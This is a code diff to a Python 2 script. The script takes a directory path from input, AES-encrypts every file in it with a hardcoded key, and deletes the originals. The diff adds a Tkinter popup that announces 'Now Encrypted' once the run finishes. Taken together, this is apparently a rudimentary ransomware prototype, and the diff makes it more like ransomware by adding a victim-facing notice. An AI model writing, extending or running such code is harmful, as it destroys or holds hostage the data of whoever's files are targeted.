@@ -1,5 +1,7 @@
 import os, os.path
 from Crypto import Random
+import Tkinter as tkinter
+import tkMessageBox as mbox
 from Crypto.Cipher import AES
 
 key = b'\xbf\xc0\x85)\x10nc\x94\x02)j\xdf\xcb\xc4\x94\x9d(\x9e[EX\xc8\xd5\xbfI{\xa2$\x05(\xd5\x18'
@@ -24,14 +26,25 @@ def encrypt_file(file_name, key):
         os.remove(file_name)
 
 
+def alert():
+    window = tkinter.Tk()
+    window.wm_withdraw()
+    mbox.showinfo('Important Message','Now Encrypted')
+
+
+
 def dir_to_encrypt(destdir):
     files = [ f for f in os.listdir(destdir) if os.path.isfile(os.path.join(destdir,f)) ]
     for f in files:
         encrypt_file("%s%s" % (destdir,f), key)
 
+
 dir = raw_input("Please enter the Directories Full Path to Encrypt: ")
 
 dir_to_encrypt(dir)
+
+alert()
+
 
 
 
